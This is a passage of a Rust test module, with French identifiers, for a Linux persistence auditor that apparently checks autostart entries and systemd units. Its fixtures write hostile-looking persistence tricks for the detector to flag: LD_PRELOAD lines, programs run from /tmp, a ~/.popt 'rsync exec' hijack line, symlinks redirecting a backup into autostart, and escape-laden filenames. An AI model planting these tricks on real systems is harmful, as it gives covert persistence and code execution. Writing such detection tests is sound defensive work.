        assert!(commande_suspecte("export TMPDIR=/tmp/moi", false).is_none());
        // Programme lancé depuis /tmp ou un dossier caché : seulement pour une commande lancée.
        assert!(commande_suspecte("/tmp/.x/run --daemon", true).is_some());
        assert!(commande_suspecte("-/dev/shm/a", true).is_some());
        assert!(commande_suspecte("~/.cache/.u/agent", true).is_some());
        assert!(commande_suspecte("%h/.mozilla/x", true).is_some());
        assert!(commande_suspecte("~/.local/bin/plein-ecran", true).is_none());
        assert!(commande_suspecte("%h/.cargo/bin/vanguard surveiller", true).is_none());
        assert!(commande_suspecte("/usr/bin/xrandr --output DP-1", true).is_none());
        assert!(commande_suspecte("cd /tmp/x", false).is_none());
    }

    /// Le fichier qui lance un programme, tel qu'il est montré : court sous le dossier personnel, et inoffensif.
    #[test]
    fn fichiers_de_demarrage_montres() {
        let maison = Path::new("/home/alice");
        assert_eq!(
            court(Path::new("/home/alice/.config/autostart/x.desktop"), maison),
            "~/.config/autostart/x.desktop"
        );
        assert_eq!(court(Path::new("/etc/profile.d/a.sh"), maison), "/etc/profile.d/a.sh");
        assert_eq!(
            court(
                Path::new("/home/alice/.config/autostart/x\x1b]0;t\x07\x1b[2K\r\u{202e}.desktop"),
                maison
            ),
            "~/.config/autostart/x�]0;t��[2K��.desktop"
        );
    }

    #[test]
    fn lignes_de_demarrage() {
        assert_eq!(
            commande_lancee("ExecStart=-/usr/bin/foo -x").as_deref(),
            Some("-/usr/bin/foo -x")
        );
        assert_eq!(
            commande_lancee("Exec=steam -silent %U").as_deref(),
            Some("steam -silent %U")
        );
        assert_eq!(commande_lancee("exec-once = waybar").as_deref(), Some("waybar"));
        assert_eq!(
            commande_lancee(r#"o.exec_on_start("~/.local/bin/plein-ecran")"#).as_deref(),
            Some("~/.local/bin/plein-ecran")
        );
        assert_eq!(commande_lancee(r#"-- o.launch_on_start("my-service")"#), None);
        assert_eq!(commande_lancee("# ExecStart=/tmp/x"), None);
        assert_eq!(commande_lancee("Description=Exec=/tmp/x"), None);
        assert_eq!(commande_lancee("Name=Steam"), None);
        assert!(definit_prechargement("export LD_PRELOAD=/home/x/.l/libz.so"));
        assert!(definit_prechargement("env = LD_PRELOAD,/tmp/a.so"));
        assert!(!definit_prechargement("unset LD_PRELOAD"));
        assert!(!definit_prechargement("# LD_PRELOAD=/x"));
    }

    /// Une arborescence jetable (racine, dossier personnel d'alice), et la lecture de sa persistance : le constat des
    /// lancements.
    struct Maison {
        racine: std::path::PathBuf,
    }

    /// Les programmes du système de la racine jetable (des scripts vides) : un nom nu ne se tait que trouvé dans les
    /// dossiers du système (vérification 3).
    const PROGRAMMES_D_ESSAI: &[&str] = &[
        "sh",
        "bash",
        "env",
        "true",
        "sleep",
        "python3",
        "node",
        "kitty",
        "firefox",
        "nautilus",
        "mako",
        "obsidian",
        "uwsm",
        "uwsm-app",
        "hypridle",
        "loginctl",
        "xsetroot",
        "pkill",
        "hyprpicker",
        "notify-send",
        "waybar",
        "omarchy-launch-terminal",
        "omarchy-launch-or-focus",
        "omarchy-lock-screen",
        "omarchy-hook",
        "omarchy-menu",
        "omarchy-launch-webapp",
        // Vérification 3 : les lignes courantes inventées (`lignes_courantes_muettes`) et les cas des rapports.
        "swayosd-server",
        "fcitx5",
        "nm-applet",
        "1password",
        "flatpak",
        "steam",
        "systemctl",
        "dbus-update-activation-environment",
        "wl-paste",
        "cliphist",
        "hyprctl",
        "gsettings",
        "blueman-applet",
        "udiskie",
        "easyeffects",
        "playerctld",
        "setsid",
        "nohup",
        "syncthing",
        "gamemoderun",
        "swaybg",
        "make",
        "find",
        "prlimit",
        "setarch",
        "perl",
        "awk",
        "cat",
        "echo",
        "xargs",
        "footclient",
        "run0",
        "swaymsg",
        "gtk-launch",
        "dex",
        "unbuffer",
        "watchexec",
        "systemd-run",
        "xdg-terminal-exec",
    ];

    impl Maison {
        fn nouvelle(nom: &str) -> Maison {
            use std::os::unix::fs::PermissionsExt as _;
            let racine = crate::essais::temporaire().join(format!("vanguard-normal-{nom}-{}", std::process::id()));
            let _ = std::fs::remove_dir_all(&racine);
            std::fs::create_dir_all(racine.join("home/alice/.config/systemd/user")).unwrap();
            let bin = racine.join("usr/bin");
            std::fs::create_dir_all(&bin).unwrap();
            for p in PROGRAMMES_D_ESSAI {
                std::fs::write(bin.join(p), "#!/bin/sh\n").unwrap();
                std::fs::set_permissions(bin.join(p), std::fs::Permissions::from_mode(0o755)).unwrap();
            }
            std::os::unix::fs::symlink("usr/bin", racine.join("bin")).unwrap();
            Maison { racine }
        }

        fn chemin(&self, relatif: &str) -> std::path::PathBuf {
            self.racine.join("home/alice").join(relatif)
        }

        /// Le disque d'essai de la sauvegarde monté (« /run/media/alice/Mon disque », type `systeme`) dans le
        /// /proc/self/mountinfo de la racine, après la racine du système ; `None` : rien de monté là.
        fn monter_le_disque(&self, systeme: Option<&str>) {
            let f = self.racine.join("proc/self/mountinfo");
            std::fs::create_dir_all(f.parent().unwrap()).unwrap();
            let disque = systeme.map_or(String::new(), |t| {
                format!("36 25 8:17 / /run/media/alice/Mon\\040disque rw,nosuid shared:1 - {t} /dev/sdb1 rw\n")
            });
            std::fs::write(f, format!("22 1 8:2 / / rw shared:1 - ext4 /dev/sda2 rw\n{disque}")).unwrap();
            // Le nœud du disque dans /sys, comme sur une vraie machine (W-6 : un /sys absent n'est pas sain).
            std::fs::create_dir_all(self.racine.join("sys/dev/block/8:17")).unwrap();
        }

        fn ecrire(&self, relatif: &str, texte: &str) {
            let p = self.chemin(relatif);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            let _ = std::fs::remove_file(&p);
            std::fs::write(p, texte).unwrap();
        }

        fn lancements(&self) -> Constat {
            persistance_dans(
                &self.racine,
                &self.racine.join("home/alice"),
                |v| (v == "XDG_RUNTIME_DIR").then(|| "/run/user/1000".into()),
                None,
                None,
            )
            .into_iter()
            .next()
            .unwrap()
        }
    }

    impl Drop for Maison {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.racine);
        }
    }

    const UNITE: &str = "[Unit]\nDescription=Rappel\n\n[Service]\nType=oneshot\nExecStart=%h/.cache-x/rappel.sh\n";

    fn maison_avec_rappel(nom: &str) -> Maison {
        let m = Maison::nouvelle(nom);
        m.ecrire(".config/systemd/user/rappel.service", UNITE);
        m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\necho rappel\n");
        m
    }

    /// COMP-3 : les unités que Vanguard pose dans le compte ne lèvent rien, dans les deux langues : veilleur,
    /// entretien, surveillance (d'aujourd'hui et d'avant), sauvegarde. Le `CPUQuota=20%` du veilleur sortait
    /// « réglage d'unité non lu » (LNX-PRS-002, Élevé) : le « % » final était pris pour un code de systemd ; le
    /// « rsync » de la sauvegarde, pour un lanceur ; un ~/.popt la lève (D-1). Celles qu'il pose en administrateur
    /// (garde, ses listes, isolement, ajout d'Ollama) sont à root dans des dossiers à root (`de_root_seul`) : la liste permise ne les juge pas, et
    /// sous `unshare -r` (identités traduites) cet essai ne saurait le montrer ; elles n'y sont donc pas.
    #[test]
    fn les_unites_de_vanguard_ne_levent_rien() {
        use std::os::unix::fs::PermissionsExt as _;
        // S-2 (relecture 0.94) : chaque unité telle que Vanguard la pose, le programme au chemin de la copie posée
        // (~/.local/share/vanguard/bin/vanguard) comme à celui d'un paquet, la sauvegarde FAT et non FAT, un disque
        // et un dossier à espace.
        let exes = ["/usr/bin/vanguard", "/home/alice/.local/share/vanguard/bin/vanguard"];
        for (i, (anglais, exe, fat)) in [false, true]
            .into_iter()
            .flat_map(|a| exes.into_iter().flat_map(move |e| [false, true].map(|f| (a, e, f))))
            .enumerate()
        {
            let m = Maison::nouvelle(&format!("unites-de-vanguard-{i}"));
            for p in [exe, "/usr/bin/env", "/usr/bin/rsync", "/usr/bin/findmnt"] {
                let f = m.racine.join(p.trim_start_matches('/'));
                std::fs::create_dir_all(f.parent().unwrap()).unwrap();
                std::fs::write(&f, "#!/bin/sh\n").unwrap();
                std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o755)).unwrap();
            }
            for d in ["Documents", "Mes images"] {
                std::fs::create_dir_all(m.chemin(d)).unwrap();
            }
            // Le disque branché, sa destination posée (C-2 : une destination qui ne se voit pas n'est pas muette).
            std::fs::create_dir_all(m.racine.join("run/media/alice/Mon disque/Sauvegarde-Vanguard/poste")).unwrap();
            m.monter_le_disque(Some("vfat"));
            let unites = || {
                let (es, et) = crate::entretien::unites_systemd(exe);
                let (ss, st) =
                    crate::reseau::surveillance::unites_systemd(exe, crate::reseau::surveillance::Reglages::Aujourdhui);
                let (_, st_avant) =
                    crate::reseau::surveillance::unites_systemd(exe, crate::reseau::surveillance::Reglages::DAvant);
                let (svt, svs) = crate::sauvegarde::unites(
                    Some(Path::new("/usr/bin/env")),
                    Path::new("/usr/bin/rsync"),
                    Some(Path::new("/usr/bin/findmnt")),
                    Some("1234-ABCD"),
                    Path::new("/run/media/alice/Mon disque"),
                    Path::new("/run/media/alice/Mon disque/Sauvegarde-Vanguard/poste"),
                    &[
                        std::path::PathBuf::from("/home/alice/Documents"),
                        std::path::PathBuf::from("/home/alice/Mes images"),
                    ],
                    fat,
                )
                .unwrap();
                let compte = vec![
                    (
                        crate::machine::linux::veilleur::UNITE.to_string(),
                        crate::machine::linux::veilleur::unite_dans(exe, anglais),
                    ),
                    (format!("{}.service", crate::entretien::NOM), es),
                    (format!("{}.timer", crate::entretien::NOM), et.to_string()),
                    (format!("{}.service", crate::reseau::surveillance::NOM), ss),
                    (format!("{}.timer", crate::reseau::surveillance::NOM), st.to_string()),
                    ("vanguard-surveillance-avant.timer".to_string(), st_avant.to_string()),
                    (crate::sauvegarde::TIMER.to_string(), svt),
                    (crate::sauvegarde::SERVICE.to_string(), svs),
                ];
                compte
            };
            let compte = if anglais {
                crate::langue::en_anglais(unites)
            } else {
                unites()
            };
            assert!(
                compte[0].1.contains("CPUQuota=20%"),
                "l'unité du veilleur a changé : revoir cet essai"
            );
            assert!(
                compte[7].1.contains(if fat {
                    " -rt --modify-window=2 "
                } else {
                    " -a --no-specials "
                }),
                "la sauvegarde a changé : revoir cet essai"
            );
            for (nom, texte) in &compte {
                m.ecrire(&format!(".config/systemd/user/{nom}"), texte);
            }
            let lever = || {
                persistance_dans(
                    &m.racine,
                    &m.chemin(""),
                    |v| (v == "XDG_RUNTIME_DIR").then(|| "/run/user/1000".into()),
                    None,
                    None,
                )
            };
            for c in &lever() {
                assert_eq!(
                    c.probleme, None,
                    "{exe}, fat {fat}, anglais {anglais} : {} {:?}",
                    c.regle, c.message
                );
            }
            // La même sauvegarde, une seule source changée pour un dossier de démarrage : plus la forme exacte, levée.
            let hostile = compte[7]
                .1
                .replace("\"/home/alice/Documents\"", "\"/home/alice/Documents/charge/\"");
            assert_ne!(hostile, compte[7].1);
            m.ecrire(
                &format!(".config/systemd/user/{}", crate::sauvegarde::SERVICE),
                &hostile,
            );
            assert!(
                lever().iter().any(|c| c.probleme.is_some()),
                "{exe}, fat {fat} : la sauvegarde changée doit lever"
            );
            // L'unité exacte, mais « rsync » est un lien vers un shell : lève.
            m.ecrire(
                &format!(".config/systemd/user/{}", crate::sauvegarde::SERVICE),
                &compte[7].1,
            );
            std::fs::remove_file(m.racine.join("usr/bin/rsync")).unwrap();
            std::os::unix::fs::symlink("sh", m.racine.join("usr/bin/rsync")).unwrap();
            assert!(
                lever().iter().any(|c| c.probleme.is_some()),
                "{exe}, fat {fat} : un rsync qui est un shell doit lever"
            );
            // D-1 : le vrai rsync revenu, un ~/.popt posé (« rsync exec … ») : la sauvegarde exacte lève.
            std::fs::remove_file(m.racine.join("usr/bin/rsync")).unwrap();
            std::fs::write(m.racine.join("usr/bin/rsync"), "#!/bin/sh\n").unwrap();
            std::fs::set_permissions(m.racine.join("usr/bin/rsync"), std::fs::Permissions::from_mode(0o755)).unwrap();
            m.ecrire(".popt", "rsync exec -a /home/alice/.cache/charge\n");
            assert!(
                lever()
                    .iter()
                    .any(|c| c.probleme == Some(Niveau::Eleve) && c.message.contains(crate::sauvegarde::SERVICE)),
                "{exe}, fat {fat} : un ~/.popt doit lever la sauvegarde"
            );
        }
    }

    /// C-2 (relecture 0.94, suite de S-1) : la forme exacte de la sauvegarde ne tient que ses mots. rsync suit un lien
    /// posé sur sa destination : `<disque>/Sauvegarde-Vanguard/<ordinateur>` (ou un dossier entre le disque et elle)
    /// changé en lien vers ~/.config/autostart y recopierait une entrée de démarrage à chaque passage. Un tel lien
    /// lève ; un findmnt qui n'en est pas un (la condition « bon disque monté » passerait toujours) aussi. Une
    /// destination qui ne se voit pas : disque débranché (sa racine absente, ou rien n'y est monté), une information
    /// (`Niveau::Info`, « débranché », la ligne nommée), jamais tue ni levée ; disque monté (ou montages illisibles),
    /// levée « non vérifié » (Élevé). Témoin : l'unité exacte vers un vrai dossier reste muette.
    #[test]
    fn la_sauvegarde_exacte_vers_un_lien_ou_un_faux_findmnt_ne_se_tait_pas() {
        use std::os::unix::fs::PermissionsExt as _;
        let cas = [
            "témoin",
            "destination en lien",
            "Sauvegarde-Vanguard en lien",
            "disque en lien",
            "findmnt qui est true",
            "findmnt en lien vers sh",
            "env en lien vers sh",
            "env du compte",
            "rsync du compte",
            "findmnt du compte",
            "rsync en lien vers le compte",
            "disque débranché",
            "destination absente",
            "destination absente, rien de monté",
            "destination absente, disque monté",
            "disque FUSE",
            "FUSE par-dessus le disque",
            "disque fuseblk",
            "disque pas monté, dossiers là",
            "montages illisibles",
            "disque image du compte",
            "image du compte sous un chiffrement",
            "partition d'une image du compte",
            "btrfs sur une image du compte",
            "boucle sans fichier lu",
            "sys absent",
            "env multi-appel coreutils",
            "env multi-appel busybox",
            "env vers un busybox du compte",
            "findmnt vers coreutils",
        ];
        let mut faux = Vec::new();
        for fat in [false, true] {
            for (i, nom) in cas.iter().enumerate() {
                let m = Maison::nouvelle(&format!("sauvegarde-lien-{fat}-{i}"));
                for p in ["env", "rsync", "findmnt"] {
                    let f = m.racine.join("usr/bin").join(p);
                    std::fs::write(&f, "#!/bin/sh\n").unwrap();
                    std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o755)).unwrap();
                }
                std::fs::create_dir_all(m.chemin("Documents")).unwrap();
                std::fs::create_dir_all(m.chemin(".config/autostart")).unwrap();
                let racine = m.racine.join("run/media/alice/Mon disque");
                let destination = racine.join("Sauvegarde-Vanguard/poste");
                std::fs::create_dir_all(&destination).unwrap();
                m.monter_le_disque(Some(if fat { "vfat" } else { "ext4" }));
                // F-4 (relecture 0.94) : un programme du compte qui porte le nom (~/bin/rsync) n'est pas le vrai.
                let programme = |p: &str| {
                    if nom.strip_suffix(" du compte") == Some(p) {
                        let f = m.chemin(&format!("bin/{p}"));
                        std::fs::create_dir_all(m.chemin("bin")).unwrap();
                        std::fs::write(&f, "#!/bin/sh\n").unwrap();
                        std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o755)).unwrap();
                        format!("/home/alice/bin/{p}")
                    } else if *nom == "findmnt qui est true" && p == "findmnt" {
                        "/usr/bin/true".to_string()
                    } else {
                        format!("/usr/bin/{p}")
                    }
                };
                let (env, rsync, findmnt) = (programme("env"), programme("rsync"), programme("findmnt"));
                let (timer, service) = crate::sauvegarde::unites(
                    Some(Path::new(&env)),
                    Path::new(&rsync),
                    Some(Path::new(&findmnt)),
                    Some("1234-ABCD"),
                    Path::new("/run/media/alice/Mon disque"),
                    Path::new("/run/media/alice/Mon disque/Sauvegarde-Vanguard/poste"),
                    &[std::path::PathBuf::from("/home/alice/Documents")],
                    fat,
                )
                .unwrap();
                m.ecrire(&format!(".config/systemd/user/{}", crate::sauvegarde::TIMER), &timer);
                m.ecrire(
                    &format!(".config/systemd/user/{}", crate::sauvegarde::SERVICE),
                    &service,
                );
                // Un dossier remplacé par un lien vers un dossier : seul le lien change ce qui s'écrit où.
                let en_lien = |d: &Path, vers: &Path| {
                    std::fs::create_dir_all(vers).unwrap();
                    std::fs::remove_dir_all(d).unwrap();
                    std::os::unix::fs::symlink(vers, d).unwrap();
                };
                match *nom {
                    "destination en lien" => en_lien(&destination, &m.chemin(".config/autostart")),
                    "Sauvegarde-Vanguard en lien" => {
                        std::fs::rename(m.chemin(".config/autostart"), m.chemin(".config/poste")).unwrap();
                        en_lien(&racine.join("Sauvegarde-Vanguard"), &m.chemin(".config"));
                    }
                    "disque en lien" => {
                        let faux = m.chemin("faux-disque");
                        std::fs::create_dir_all(faux.join("Sauvegarde-Vanguard/poste")).unwrap();
                        en_lien(&racine, &faux);
                    }
                    "findmnt en lien vers sh" => {
                        std::fs::remove_file(m.racine.join("usr/bin/findmnt")).unwrap();
                        std::os::unix::fs::symlink("sh", m.racine.join("usr/bin/findmnt")).unwrap();
                    }
                    "rsync en lien vers le compte" => {
                        let f = m.chemin("bin/rsync");
                        std::fs::create_dir_all(m.chemin("bin")).unwrap();
                        std::fs::write(&f, "#!/bin/sh\n").unwrap();
                        std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o755)).unwrap();
                        std::fs::remove_file(m.racine.join("usr/bin/rsync")).unwrap();
                        std::os::unix::fs::symlink("../../home/alice/bin/rsync", m.racine.join("usr/bin/rsync"))
                            .unwrap();
                    }
                    "env en lien vers sh" => {
                        std::fs::remove_file(m.racine.join("usr/bin/env")).unwrap();
                        std::os::unix::fs::symlink("sh", m.racine.join("usr/bin/env")).unwrap();
                    }
                    // Ubuntu 25.10 (uutils), busybox : env est un lien vers un programme à plusieurs noms.
                    multi @ ("env multi-appel coreutils"
                    | "env multi-appel busybox"
                    | "env vers un busybox du compte"
                    | "findmnt vers coreutils") => {
                        let (p, vers) = match multi {
                            "env multi-appel coreutils" => ("env", "coreutils"),
                            "env multi-appel busybox" => ("env", "../lib/busybox/busybox"),
                            "env vers un busybox du compte" => ("env", "../../home/alice/bin/busybox"),
                            _ => ("findmnt", "coreutils"),
                        };
                        let cible = m.racine.join("usr/bin").join(vers);
                        std::fs::create_dir_all(cible.parent().unwrap()).unwrap();
                        std::fs::write(&cible, "#!/bin/sh\n").unwrap();
                        std::fs::set_permissions(&cible, std::fs::Permissions::from_mode(0o755)).unwrap();
                        std::fs::remove_file(m.racine.join("usr/bin").join(p)).unwrap();
                        std::os::unix::fs::symlink(vers, m.racine.join("usr/bin").join(p)).unwrap();
                    }
                    "disque débranché" => std::fs::remove_dir_all(&racine).unwrap(),
                    // Sans /proc/self/mountinfo sous la racine jetable : les montages ne se lisent pas.
                    "destination absente" => {
                        std::fs::remove_dir_all(&destination).unwrap();
                        std::fs::remove_file(m.racine.join("proc/self/mountinfo")).unwrap();
                    }
                    absente @ ("destination absente, rien de monté" | "destination absente, disque monté") => {
                        std::fs::remove_dir_all(&destination).unwrap();
                        m.monter_le_disque(absente.ends_with("disque monté").then_some("vfat"));
                    }
                    // D-3 (relecture 0.94) : ce qui est monté au disque compte, le dernier montage posé à ce point.
                    "disque FUSE" => m.monter_le_disque(Some("fuse.sshfs")),
                    "FUSE par-dessus le disque" => {
                        let f = m.racine.join("proc/self/mountinfo");
                        let mut t = std::fs::read_to_string(&f).unwrap();
                        t.push_str("90 36 0:77 / /run/media/alice/Mon\\040disque rw shared:2 - fuse /dev/sdb1 rw\n");
                        std::fs::write(f, t).unwrap();
                    }
                    "disque fuseblk" => m.monter_le_disque(Some("fuseblk")),
                    // W-6 (relecture 0.95) : sans /sys (caché ou non monté), chaque lecture rendait « absent » et le
                    // disque était compté sain.
                    "sys absent" => std::fs::remove_dir_all(m.racine.join("sys")).unwrap(),
                    "disque pas monté, dossiers là" => m.monter_le_disque(None),
                    "montages illisibles" => {
                        let f = m.racine.join("proc/self/mountinfo");
                        std::fs::remove_file(&f).unwrap();
                        std::fs::create_dir_all(f).unwrap();
                    }
                    // V-7 (relecture 0.95) : une image du compte montée sans droits d'administrateur (udisks) au point
                    // du disque, directement, sous un chiffrement (dm), en partition, ou en btrfs (numéro 0:N).
                    image @ ("disque image du compte"
                    | "image du compte sous un chiffrement"
                    | "partition d'une image du compte"
                    | "btrfs sur une image du compte"
                    | "boucle sans fichier lu") => {
                        let (numero, source) = match image {
                            "image du compte sous un chiffrement" => ("254:0", "/dev/mapper/coffre"),
                            "partition d'une image du compte" => ("259:0", "/dev/loop0p1"),
                            "btrfs sur une image du compte" => ("0:45", "/dev/loop0"),
                            _ => ("7:0", "/dev/loop0"),
                        };
                        std::fs::write(
                            m.racine.join("proc/self/mountinfo"),
                            format!(
                                "22 1 8:2 / / rw shared:1 - ext4 /dev/sda2 rw\n36 25 {numero} / \
                                 /run/media/alice/Mon\\040disque rw,nosuid shared:1 - ext4 {source} rw\n"
                            ),
                        )
                        .unwrap();
                        let bloc = m.racine.join("sys/dev/block");
                        if image != "boucle sans fichier lu" {
                            std::fs::create_dir_all(bloc.join("7:0/loop")).unwrap();
                            std::fs::create_dir_all(bloc.join("7:0/loop0p1")).unwrap();
                            std::fs::write(bloc.join("7:0/loop/backing_file"), "/home/alice/coffre.img\n").unwrap();
                        }
                        match image {
                            "image du compte sous un chiffrement" => {
                                std::fs::create_dir_all(bloc.join("254:0/slaves")).unwrap();
                                std::os::unix::fs::symlink("../../7:0", bloc.join("254:0/slaves/loop0")).unwrap();
                            }
                            "partition d'une image du compte" => {
                                std::os::unix::fs::symlink("7:0/loop0p1", bloc.join("259:0")).unwrap();
                            }
                            "btrfs sur une image du compte" => {
                                std::fs::create_dir_all(m.racine.join("sys/class/block")).unwrap();
                                std::os::unix::fs::symlink(
                                    "../../dev/block/7:0",
                                    m.racine.join("sys/class/block/loop0"),
                                )
                                .unwrap();
                            }
                            _ => {}
                        }
                    }
                    _ => {}
                }
                let constats: Vec<(Option<Niveau>, String)> = persistance_dans(
                    &m.racine,
                    &m.chemin(""),
                    |v| (v == "XDG_RUNTIME_DIR").then(|| "/run/user/1000".into()),
                    None,
                    None,
                )
                .into_iter()
                .filter(|c| c.probleme.is_some())
                .map(|c| (c.probleme, c.message))
                .collect();
                let nommee = |n: Niveau, mot: &str| {
                    matches!(&constats[..], [(Some(x), l)] if *x == n
                        && l.contains(&format!("{}:", crate::sauvegarde::SERVICE)) && l.contains(mot))
                };
                let juste = match *nom {
                    "témoin" | "disque fuseblk" | "env multi-appel coreutils" | "env multi-appel busybox" => {
                        constats.is_empty()
                    }
                    "env vers un busybox du compte" => nommee(Niveau::Eleve, "seul root peut changer"),
                    "disque débranché" | "destination absente, rien de monté" | "disque pas monté, dossiers là" => {
                        nommee(Niveau::Info, "débranché")
                    }
                    "disque FUSE" | "FUSE par-dessus le disque" => nommee(Niveau::Eleve, "montage FUSE"),
                    "montages illisibles" | "boucle sans fichier lu" | "sys absent" => {
                        nommee(Niveau::Eleve, "non vérifié")
                    }
                    "disque image du compte"
                    | "image du compte sous un chiffrement"
                    | "partition d'une image du compte"
                    | "btrfs sur une image du compte" => nommee(Niveau::Eleve, "image (périphérique boucle)"),
                    "destination absente" | "destination absente, disque monté" => {
                        nommee(Niveau::Eleve, "non vérifié") && !constats[0].1.contains("reconnue, disque débranché")
                    }
                    "env du compte" | "rsync du compte" | "findmnt du compte" | "rsync en lien vers le compte" => {
                        nommee(Niveau::Eleve, "seul root peut changer")
                    }
                    _ => constats
                        .iter()
                        .any(|(n, l)| *n == Some(Niveau::Eleve) && l.contains(crate::sauvegarde::SERVICE)),
                };
                if !juste {
                    faux.push(format!("fat {fat}, {nom} : {constats:?}"));
                }
            }
        }
        assert!(
            faux.is_empty(),
            "le témoin se tait, débranché s'informe, chaque autre cas lève (non vérifié monté sans destination) : \
             {faux:#?}"
        );
    }

    /// D-1 (relecture 0.94) : rsync lit au départ les fichiers de réglages de popt (`<sysconfdir>/popt`,
    /// `<sysconfdir>/popt.d/*`, `$HOME/.popt`), où une ligne « rsync exec -a /chemin/programme » lui fait lancer ce
    /// programme à la place de la copie (vu sur rsync 3.5.1 avec un programme témoin : lancé, rien copié, code 0). La
    /// forme exacte de la sauvegarde ne se tait que si rien de tel n'est là : un ~/.popt (fichier, lien, illisible,
    /// dossier) lève (Élevé, jamais déclarable, sa ligne ExecStart nommée) ; un fichier du système (/etc ou /usr/etc :
    /// popt, popt.d non vide) aussi, dit « non vérifié » ; un complément du compte (« .service.d ») qui pourrait changer
    /// HOME aussi. Un popt.d vide, un dossier de compléments vide : muets. L'unité hostile de S-1 lève toujours.
    #[test]
    fn la_sauvegarde_exacte_ne_se_tait_que_sans_reglages_de_popt() {
        use std::os::unix::fs::PermissionsExt as _;
        let cas: &[(&str, bool)] = &[
            ("témoin", false),
            ("~/.popt", true),
            ("~/.popt, disque débranché", true),
            ("~/.popt en lien", true),
            ("~/.popt illisible", true),
            ("~/.popt dossier", true),
            ("/etc/popt", true),
            ("/usr/etc/popt", true),
            ("/usr/etc/popt.d/x", true),
            ("/etc/popt.d/x", true),
            ("/usr/etc/popt.d vide", false),
            ("complément HOME", true),
            ("complément vide", false),
            ("complément d'un alias", true),
            ("complément d'un alias d'alias", true),
            ("complément du fichier visé", true),
        ];
        let mut faux = Vec::new();
        for fat in [false, true] {
            for (i, (nom, leve)) in cas.iter().enumerate() {
                let m = Maison::nouvelle(&format!("sauvegarde-popt-{fat}-{i}"));
                for p in ["env", "rsync", "findmnt"] {
                    let f = m.racine.join("usr/bin").join(p);
                    std::fs::write(&f, "#!/bin/sh\n").unwrap();
                    std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o755)).unwrap();
                }
                std::fs::create_dir_all(m.chemin("Documents")).unwrap();
                std::fs::create_dir_all(m.racine.join("run/media/alice/Mon disque/Sauvegarde-Vanguard/poste")).unwrap();
                m.monter_le_disque(Some(if fat { "vfat" } else { "ext4" }));
                let (timer, service) = crate::sauvegarde::unites(
                    Some(Path::new("/usr/bin/env")),
                    Path::new("/usr/bin/rsync"),
                    Some(Path::new("/usr/bin/findmnt")),
                    Some("1234-ABCD"),
                    Path::new("/run/media/alice/Mon disque"),
                    Path::new("/run/media/alice/Mon disque/Sauvegarde-Vanguard/poste"),
                    &[std::path::PathBuf::from("/home/alice/Documents")],
                    fat,
                )
                .unwrap();
                m.ecrire(&format!(".config/systemd/user/{}", crate::sauvegarde::TIMER), &timer);
                m.ecrire(
                    &format!(".config/systemd/user/{}", crate::sauvegarde::SERVICE),
                    &service,
                );
                let option = if fat { "-r" } else { "-a" };
                let ligne = format!("rsync exec {option} /home/alice/.cache/charge\n");
                m.ecrire(".cache/charge", "#!/bin/sh\n");
                let systeme = |chemin: &str| {
                    let f = m.racine.join(chemin.trim_start_matches('/'));
                    std::fs::create_dir_all(f.parent().unwrap()).unwrap();
                    std::fs::write(f, &ligne).unwrap();
                };
                match *nom {
                    "~/.popt" => m.ecrire(".popt", &ligne),
                    "~/.popt, disque débranché" => {
                        m.ecrire(".popt", &ligne);
                        std::fs::remove_dir_all(m.racine.join("run/media/alice/Mon disque")).unwrap();
                    }
                    "~/.popt en lien" => {
                        m.ecrire(".cache/reglages", &ligne);
                        std::os::unix::fs::symlink(".cache/reglages", m.chemin(".popt")).unwrap();
                    }
                    "~/.popt illisible" => {
                        m.ecrire(".popt", &ligne);
                        std::fs::set_permissions(m.chemin(".popt"), std::fs::Permissions::from_mode(0o000)).unwrap();
                    }
                    "~/.popt dossier" => std::fs::create_dir_all(m.chemin(".popt")).unwrap(),
                    "/usr/etc/popt.d vide" => std::fs::create_dir_all(m.racine.join("usr/etc/popt.d")).unwrap(),
                    "complément HOME" => m.ecrire(
                        &format!(".config/systemd/user/{}.d/home.conf", crate::sauvegarde::SERVICE),
                        "[Service]\nEnvironment=HOME=/home/alice/Documents\n",
                    ),
                    "complément vide" => std::fs::create_dir_all(
                        m.chemin(&format!(".config/systemd/user/{}.d", crate::sauvegarde::SERVICE)),
                    )
                    .unwrap(),
                    // F-3 (relecture 0.94) : systemd applique à l'unité les compléments de ses alias (un lien vers
                    // elle dans un dossier d'unités) et ceux du fichier qu'elle vise si elle est un lien.
                    "complément d'un alias" | "complément d'un alias d'alias" => {
                        let u = m.chemin(".config/systemd/user");
                        std::os::unix::fs::symlink(crate::sauvegarde::SERVICE, u.join("copie-x.service")).unwrap();
                        let alias = if nom.ends_with("d'alias") {
                            std::os::unix::fs::symlink("copie-x.service", u.join("copie-y.service")).unwrap();
                            "copie-y.service"
                        } else {
                            "copie-x.service"
                        };
                        m.ecrire(
                            &format!(".config/systemd/user/{alias}.d/home.conf"),
                            "[Service]\nEnvironment=HOME=/home/alice/Documents\n",
                        );
                    }
                    "complément du fichier visé" => {
                        let u = m.chemin(".config/systemd/user");
                        std::fs::rename(u.join(crate::sauvegarde::SERVICE), u.join("copie-z.service")).unwrap();
                        std::os::unix::fs::symlink("copie-z.service", u.join(crate::sauvegarde::SERVICE)).unwrap();
                        m.ecrire(
                            ".config/systemd/user/copie-z.service.d/home.conf",
                            "[Service]\nEnvironment=HOME=/home/alice/Documents\n",
                        );
                    }
                    "témoin" => {}
                    chemin => systeme(chemin),
                }
                let c = m.lancements();
                let execstart = service
                    .lines()
                    .position(|l| l.starts_with("ExecStart="))
                    .map(|n| format!("~/.config/systemd/user/{}:{} : ", crate::sauvegarde::SERVICE, n + 1));
                let nommee = execstart.is_some_and(|e| c.message.contains(&e));
                let juste = if *leve {
                    c.probleme == Some(Niveau::Eleve)
                        && nommee
                        && crate::apprentissage::declarable(&c).is_err()
                        && (!nom.contains("etc/") || c.message.contains("non vérifié"))
                } else {
                    c.probleme.is_none()
                };
                if !juste {
                    faux.push(format!("fat {fat}, {nom} : {:?} {:?}", c.probleme, c.message));
                }
            }
        }
        // S-1 : la copie hostile du rapport, sous le nom de la sauvegarde, sans aucun ~/.popt.
        let m = Maison::nouvelle("sauvegarde-popt-hostile");
